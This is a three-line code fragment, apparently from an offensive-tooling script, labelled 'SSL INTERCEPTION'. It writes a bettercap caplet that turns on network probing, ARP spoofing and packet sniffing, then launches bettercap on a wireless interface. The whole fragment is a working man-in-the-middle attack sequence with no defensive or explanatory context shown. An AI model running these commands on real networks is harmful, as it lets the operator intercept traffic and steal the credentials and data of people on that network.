janus.log(">>> [ACHERON] SSL INTERCEPTION")
janus.shell("echo 'net.probe on; arp.spoof on; net.sniff on' > attack.cap")
janus.shell("bettercap -iface wlan0 -caplet attack.cap")
